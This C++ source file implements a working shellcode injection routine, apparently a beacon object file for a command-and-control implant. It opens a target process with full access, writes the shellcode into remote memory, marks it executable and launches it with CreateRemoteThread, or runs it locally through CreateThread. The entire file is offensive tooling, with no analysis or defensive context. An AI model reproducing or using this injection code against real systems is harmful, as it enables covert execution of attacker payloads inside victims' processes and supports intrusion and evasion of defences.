#include <general.h>

auto ExplicitInjection(
    _In_  INT64 ProcessObj,
    _In_  BOOL  IsPid,
    _In_  PBYTE ShellcodeBuff,
    _In_  ULONG ShellcodeSize,
    _In_  PBYTE Argument,
    _In_  PROCESS_INFORMATION* ProcessInfo = nullptr
) -> NTSTATUS {
    LONG   ErrorCode     = ERROR_SUCCESS;
    HANDLE ProcessHandle = (HANDLE)ProcessObj;
    HANDLE ThreadHandle  = nullptr;
    BOOL   NeedCloseHandle = FALSE;

    SIZE_T BytesWritten  = 0;
    ULONG  OldProtection = 0;
    ULONG  ThreadId      = 0;
    PVOID  ShellcodePtr  = nullptr;

    if ( IsPid ) {
        if ( ProcessInfo ) {
            ProcessInfo->dwProcessId = ProcessObj;
        }
        
        ProcessHandle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, ProcessObj );
        if ( ! ProcessHandle ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Open handle to target process failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }
        NeedCloseHandle = TRUE;

        ShellcodePtr = VirtualAllocEx( ProcessHandle, nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
        if ( ! ShellcodePtr ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            if ( NeedCloseHandle ) CloseHandle( ProcessHandle ); 
            return ErrorCode;
        }

        if ( ! WriteProcessMemory( ProcessHandle, ShellcodePtr, ShellcodeBuff, ShellcodeSize, &BytesWritten ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Write shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            if ( NeedCloseHandle ) CloseHandle( ProcessHandle );
            return ErrorCode;
        }

        if ( ! VirtualProtectEx( ProcessHandle, ShellcodePtr, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            if ( NeedCloseHandle ) CloseHandle( ProcessHandle );
            return ErrorCode;
        }

        ThreadHandle = CreateRemoteThread( ProcessHandle, nullptr, 0, (LPTHREAD_START_ROUTINE)ShellcodePtr, Argument, 0, &ThreadId );
        if ( ! ThreadHandle ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            if ( NeedCloseHandle ) CloseHandle( ProcessHandle );
            return ErrorCode;
        }
    } else {
        ShellcodePtr = VirtualAlloc( nullptr, ShellcodeSize, MEM_COMMIT, PAGE_READWRITE );
        if ( ! ShellcodePtr ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Allocation memory to shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        memcpy( ShellcodePtr, ShellcodeBuff, ShellcodeSize );

        if ( ! VirtualProtect( ShellcodePtr, ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection ) ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Change protection to RX failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }

        ThreadHandle = CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)ShellcodePtr, nullptr, 0, &ThreadId );
        if ( ! ThreadHandle ) {
            ErrorCode = GetLastError();
            BeaconPrintfW( CALLBACK_ERROR, L"Create thread to execute shellcode failed with error: (%d) %s", ErrorCode, fmt_error( ErrorCode ) );
            return ErrorCode;
        }
    }

    if ( ProcessInfo ) {
        ProcessInfo->hProcess   = ProcessHandle;
        ProcessInfo->hThread    = ThreadHandle;
        ProcessInfo->dwThreadId = ThreadId;
    } else if ( NeedCloseHandle ) {
        CloseHandle( ProcessHandle );
    }

    return ErrorCode;
}